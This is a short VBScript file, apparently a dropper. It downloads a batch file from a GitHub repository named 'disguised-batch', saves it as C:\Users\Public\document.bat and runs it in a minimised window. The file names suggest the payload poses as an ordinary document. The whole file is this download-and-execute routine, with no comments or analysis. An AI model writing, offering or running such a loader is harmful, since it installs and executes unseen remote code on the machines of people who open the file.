Dim oXMLHTTP
Dim oStream

Set oXMLHTTP = CreateObject("MSXML2.XMLHTTP.3.0")

oXMLHTTP.Open "GET", "https://raw.githubusercontent.com/wishtag/disguised-batch/refs/heads/main/document.bat", False
oXMLHTTP.Send

If oXMLHTTP.Status = 200 Then
    Set oStream = CreateObject("ADODB.Stream")
    oStream.Open
    oStream.Type = 1
    oStream.Write oXMLHTTP.responseBody
    oStream.Position = 0
    oStream.SaveToFile "C:\Users\Public\document.bat", 2
    oStream.Close
End If

Set shell = CreateObject("WScript.Shell")
shell.Run "C:\Users\Public\document.bat", 2